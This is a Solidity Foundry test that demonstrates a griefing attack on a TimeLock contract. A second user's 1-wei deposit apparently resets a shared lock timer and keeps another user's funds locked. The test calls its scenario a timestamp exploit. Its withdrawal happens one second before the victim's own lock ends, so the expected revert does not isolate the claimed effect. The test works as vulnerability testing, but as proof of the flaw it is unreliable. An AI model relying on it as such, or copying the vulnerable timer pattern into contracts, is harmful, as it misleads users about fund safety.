contract TimeLockTest is Test {
    TimeLock timeLock;
    address bob = makeAddr("bob");
    address alice = makeAddr("alice");

    function setUp() public {
        timeLock = new TimeLock();
        vm.deal(bob, 1 ether);
        vm.deal(alice, 1 ether);
    }

    function testPredictableTimestampExploit() public {
        // Bob deposits 1 ether (locks for 1 week)
        vm.prank(bob);
        timeLock.deposit{value: 1 ether}();

        // Advance to 1 second before lock expiration
        uint256 lockTime = block.timestamp + 1 weeks - 1;
        vm.warp(lockTime);

        // Alice deposits tiny amount to reset global timer
        vm.prank(alice);
        timeLock.deposit{value: 1 wei}();

        // Bob attempts to withdraw prematurely
        vm.prank(bob);
        vm.expectRevert("Funds are still locked");
        timeLock.withdraw();
    }
}
